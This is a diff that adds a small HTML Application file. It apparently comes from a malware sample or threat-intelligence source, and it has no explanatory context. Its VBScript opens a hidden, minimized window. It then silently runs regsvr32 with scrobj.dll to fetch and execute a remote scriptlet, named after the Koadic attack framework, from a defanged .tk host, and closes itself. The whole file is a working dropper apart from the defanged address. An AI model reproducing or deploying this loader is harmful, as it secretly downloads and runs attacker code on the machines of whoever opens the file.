@@ -1,0 +1,13 @@
+<html>
+<head><HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no" />
+<script language="VBScript">
+    Dim objShell, strProgram
+    Set objShell = CreateObject("WScript.Shell")
+    strProgram = "regsvr32.exe /s /u /i:hxxp://slprmnr[.]tk/koadic.png scrobj.dll"
+    objShell.Run strProgram,0,True
+    self.close()
+</script>
+</head>
+<body>
+</body>
+</html>
